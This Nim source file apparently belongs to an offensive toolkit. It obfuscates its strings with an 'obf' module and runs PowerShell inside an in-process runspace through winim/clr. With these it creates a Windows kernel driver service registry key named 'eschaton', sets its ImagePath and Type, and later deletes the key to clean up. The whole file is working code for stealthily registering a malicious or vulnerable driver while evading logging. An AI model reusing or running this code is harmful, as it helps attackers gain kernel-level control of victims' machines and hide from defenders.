import winim/clr, sugar
import obf

proc exec_power*(driver_path : string, driver_file : string) =
    var 
        Automation = load(obf("System.Management.Automation"))
        RunspaceFactory = Automation.GetType(obf("System.Management.Automation.Runspaces.RunspaceFactory"))
        runspace = @RunspaceFactory.CreateRunspace()
        path = driver_path & driver_file
        cmd1 = obf("New-Item -Path HKLM:\\System\\CurrentControlSet\\Services\\ -Name \"eschaton\"")
        cmd2 = obf("New-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\eschaton -Name \"ImagePath\" -Value \"") & path & obf("\"  -PropertyType \"String\" ")
        cmd3 = obf("New-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\eschaton -Name \"Type\" -Value 1")
    dump path
    echo obf("[+] writing driver registry")

    runspace.Open()

    var pipeline = runspace.CreatePipeline()

    pipeline.Commands.AddScript(cmd1)
    pipeline.Commands.AddScript(cmd2)
    pipeline.Commands.AddScript(cmd3)

    discard pipeline.Invoke()

    runspace.Close()

proc cleanup_power*() =
    var 
        Automation = load(obf("System.Management.Automation"))
        RunspaceFactory = Automation.GetType(obf("System.Management.Automation.Runspaces.RunspaceFactory"))
        runspace = @RunspaceFactory.CreateRunspace()
        cmd1 = obf("Remove-Item -Path HKLM:\\System\\CurrentControlSet\\Services\\eschaton")

    runspace.Open()
    var pipeline = runspace.CreatePipeline()

    pipeline.Commands.AddScript(cmd1)
    discard pipeline.Invoke()

    runspace.Close()

    echo obf("[+] driver registry cleaned")